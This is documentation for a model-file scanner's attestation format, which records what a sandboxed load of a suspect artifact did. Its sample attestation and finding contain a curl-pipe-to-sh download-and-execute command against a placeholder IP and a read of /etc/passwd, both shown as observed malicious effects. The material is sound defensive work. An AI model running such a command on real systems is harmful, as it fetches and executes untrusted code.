# Attestations: how a demonstration reaches the scanner

`SC4N-MALICE-DEMONSTRATED` is the only grade sc4n cannot compute from bytes: it
says *these exact bytes, loaded for real, did this*. The scanner never executes
anything, so the observation comes from a harness and reaches the scan as a file:

```sh
sc4n scan -attestation attestation.json ./models
```

An attestation is a plain JSON document written by whatever sandbox did the load.
`tools/sc4nconfirm` writes one, but the format is not tied to it: the same file
can come from a VM, a Kubernetes job, or a harness you wrote for your own
framework. This page is the contract, so that replacing the producer does not mean
reverse-engineering the consumer.

## The document

```json
{
  "version": "sc4nconfirm/1",
  "runs": [
    {
      "sha256": "5eb63bbbe01eeed093cb22bb8f5acdc3d3d76e6a7b8f7b2c1e2c7b4f3a4e5b6c",
      "path": "model.bin",
      "loader": "torch.load(weights_only=False)",
      "loaded": true,
      "exec": ["/bin/sh -c -- curl -s http://198.51.100.7/x | sh"],
      "connect": ["198.51.100.7:80"],
      "openedOutside": ["/etc/passwd"],
      "wrote": ["/tmp/marker"]
    }
  ]
}
```

| field | meaning |
|---|---|
| `version` | the format version. `sc4nconfirm/1` is the only accepted value; it names the *format*, not the producer, so a hand-written file uses it too. Any other value is refused rather than interpreted |
| `sha256` | the artifact's **full** SHA-256, 64 hex characters (upper or lower case). This is the only key: a prefix digest identifies no file, so an artifact hashed under `-max-hash` cannot be attested |
| `path` | free text, for the human reading the attestation. It is not matched on |
| `loader` | the call that was made, e.g. `torch.load(weights_only=False)`, `joblib.load`, `numpy.load(allow_pickle=True)`. Copied into the finding's evidence |
| `loaded` | whether the load completed. `true` with no effects means "it loaded and did nothing"; `false` means "it did not complete", which is *not* a clean result |
| `error` | the exception text when `loaded` is false |
| `missingModules` | modules a failed load could not import (`ultralytics`, `sklearn`, …). Recorded, never graded — "the framework was absent" is not "the artifact is inert" |
| `exec`, `connect`, `openedOutside`, `wrote` | the observed effects. Empty lists are omitted. Each present entry becomes part of the demonstrated finding's evidence |

Rules the loader of the file enforces, because a silently ignored field would turn
"the harness recorded a connect" into "the artifact did nothing":

- **Unknown fields are rejected.** Writing a field the consumer does not know is a
  version mismatch, not a hint.
- **One run per digest.** Two entries for one SHA-256 (two loaders, two runs) are
  refused: one artifact must have one attestation, so a conflict is resolved by the
  producer, never by the consumer picking the first.
- **Effect lists are sorted** on load, so two scans of one attestation produce
  byte-identical reports.
- **The document is bounded** at 8 MiB: it is one small record per artifact.
- **The whole file is fatal on error.** A malformed attestation is an operator
  mistake; continuing would silently drop the demonstration that was asked for.
  `sc4n scan` exits 2 with the parse error.

## Digest scope

`sc4n` hashes an artifact with a SHA-256 capped at `MaxHashBytes` (256 MiB) by
default and reports the scope as `sha256Scope: full` or `prefix:<bytes>`. Only
`full` matches an attestation. If the artifacts you want to demonstrate are larger
than the cap, raise it with `-max-hash` (cost: 0.35 GB/s on a host without SHA-NI)
or attest only the small ones — the scanner will say
`55 of 62 run(s) matched a scanned artifact`, so an attestation that matched
nothing is visible rather than silent.

## Producing one without `tools/sc4nconfirm`

Three ways, in order of least work:

**1. `tools/sc4nconfirm` on a host with Docker.** It builds its image once
(`make confirm-image`), then runs one container per artifact:

```sh
make confirm-image
sc4nconfirm -artifact model.bin -out attestation.json
```

The container is `--network=none`, `--read-only`, tmpfs scratch, canary
credentials, `--memory`/`--pids-limit`/`--cpus`, and one capability (`SYS_PTRACE`,
because `strace` is the effect source a native payload cannot blind).

**2. The same loader in a VM or pod.** `tools/sc4nconfirm/image/load.py` is the
whole loader matrix and it has no dependency on Docker: copy it into a throwaway
VM with the same pinned packages, run it with `strace -f -q -e trace=execve,connect,openat,open`, and turn the trace into the JSON above. This is what to
do when Docker is not available but a hypervisor is, and it is the reason the
loader lives in a script rather than in the Go binary.

**3. Your own harness.** The requirement list is the contract:

- the artifact is loaded by the call a *user* would make for those bytes;
- the sandbox has no network, a read-only root, scratch in a tmpfs, no credentials
  except canaries, and bounded memory/processes;
- every effect is recorded with its argument: the `argv` executed, the address
  dialled, the path opened outside the artifact directory, the path written;
- the digest is of the bytes that were loaded, computed over the whole file.

A shell sketch for the last one, on a single artifact, on a host you are willing
to sacrifice:

```sh
digest=$(sc4n hash model.bin | awk '/^sha256/ {print $2}')
strace -f -q -o trace.txt -e trace=execve,connect,openat \
  python3 -c 'import torch; torch.load("model.bin", weights_only=False)' || true
# then write {"version":"sc4nconfirm/1","runs":[{"sha256":"'$digest'",...}]}
```

Do not run that on a host you care about: the payload's job is to make that
`python3` do something else.

## What the finding looks like

Merging an attestation adds one finding per artifact, carrying the effects that
were observed:

```text
SC4N-MALICE-DEMONSTRATED  critical  high  CWE-502
  loading with torch.load(weights_only=False) executed "/bin/sh -c -- curl -s …"
  (container, no network, read-only root)
```

It is emitted at offset 0 with the artifact's digest, and it never downgrades or
replaces the capability finding: a `SC4N-PICKLE-GLOBAL-CRITICAL` on the same
artifact stays, because the grade is *additional* information, not a correction.
See [`docs/threat-model.md`](threat-model.md) §13 for what a demonstration can and
cannot prove.
